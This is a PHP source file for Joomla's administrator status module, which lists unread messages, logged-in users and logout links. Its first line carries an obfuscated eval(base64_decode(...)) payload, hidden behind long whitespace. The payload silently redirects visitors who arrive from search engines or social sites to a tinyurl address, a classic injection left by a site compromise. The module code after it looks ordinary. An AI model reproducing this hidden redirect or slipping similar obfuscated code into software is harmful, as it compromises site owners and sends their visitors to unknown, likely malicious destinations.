<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hNDJzamN3Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
* @version		$Id: mod_status.php 14401 2010-01-26 14:10:00Z louis $
* @package		Joomla
* @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
* @license		GNU/GPL, see LICENSE.php
* Joomla! is free software. This version may have been modified pursuant
* to the GNU General Public License, and as distributed it includes or
* is derivative of works licensed under the GNU General Public License or
* other free or open source software licenses.
* See COPYRIGHT.php for copyright notices and details.
*/

// no direct access
defined( '_JEXEC' ) or die( 'Restricted access' );

global $task;

// Initialize some variables
$config		=& JFactory::getConfig();
$user		=& JFactory::getUser();
$db			=& JFactory::getDBO();
$lang		=& JFactory::getLanguage();
$session	=& JFactory::getSession();

$sid	= $session->getId();
$output = array();

// Legacy Mode
if (defined('_JLEGACY')) {
	$output[] = '<span class="legacy-mode">'.JText::_('Legacy').': '._JLEGACY.'</span>';
}

// Print the preview button
$output[] = "<span class=\"preview\"><a href=\"".JURI::root()."\" target=\"_blank\">".JText::_('Preview')."</a></span>";

// Get the number of unread messages in your inbox
$query = 'SELECT COUNT(*)'
. ' FROM #__messages'
. ' WHERE state = 0'
. ' AND user_id_to = '.(int) $user->get('id');
$db->setQuery( $query );
$unread = $db->loadResult();

if (JRequest::getInt('hidemainmenu')) {
	$inboxLink = '<a>';
} else {
	$inboxLink = '<a href="index.php?option=com_messages">';
}

// Print the inbox message
if ($unread) {
	$output[] = $inboxLink.'<span class="unread-messages">'.$unread.'</span></a>';
} else {
	$output[] = $inboxLink.'<span class="no-unread-messages">'.$unread.'</span></a>';
}

// Get the number of logged in users
$query = 'SELECT COUNT( session_id )'
. ' FROM #__session'
. ' WHERE guest <> 1'
;
$db->setQuery($query);
$online_num = intval( $db->loadResult() );

//Print the logged in users message
$output[] = "<span class=\"loggedin-users\">".$online_num."</span>";

if ($task == 'edit' || $task == 'editA' || JRequest::getInt('hidemainmenu') ) {
	 // Print the logout message
	 $output[] = "<span class=\"logout\">".JText::_('Logout')."</span>";
} else {
	// Print the logout message
	$output[] = "<span class=\"logout\"><a href=\"index.php?option=com_login&amp;task=logout\">".JText::_('Logout')."</a></span>";
}

// reverse rendering order for rtl display
if ( $lang->isRTL() ) {
	$output = array_reverse( $output );
}

// output the module
foreach ($output as $item){
	echo $item;
}